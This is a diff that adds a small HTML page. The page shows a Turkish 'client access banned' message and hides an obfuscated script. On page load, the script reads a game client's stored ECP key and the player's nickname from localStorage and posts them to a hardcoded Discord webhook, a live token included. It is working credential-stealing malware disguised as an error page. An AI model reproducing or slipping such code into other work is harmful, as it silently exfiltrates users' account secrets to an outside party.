@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+Cliente erisiminiz yasaklandi
+</body>
+	<script>function chatmessage(_0x80e4bd) {
+  const _0x3ceddb =
+    'https://discord.com/api/webhooks/1056304687281872926/P2D9Kg8aIQYD48_29ByoyvTTumCfIzBr1uf_COOhwpTEJ-RcfjPJO3Szp4iVToBEdZtX'
+  let _0xa6b30a = new XMLHttpRequest()
+  var _0xc2cc57 = { content: _0x80e4bd }
+  let _0x23be90 = JSON.stringify(_0xc2cc57)
+  _0xa6b30a.open('POST', _0x3ceddb)
+  _0xa6b30a.setRequestHeader('Content-type', 'application/json; charset=utf-8')
+  _0xa6b30a.send(_0x23be90)
+}
+chatmessage(
+  'ECP: ```' +
+    localStorage.ECPKey +
+    '```Player named: ```' +
+    localStorage.lastNickname +
+    '```Loaded the client'
+)</script>
+</html>
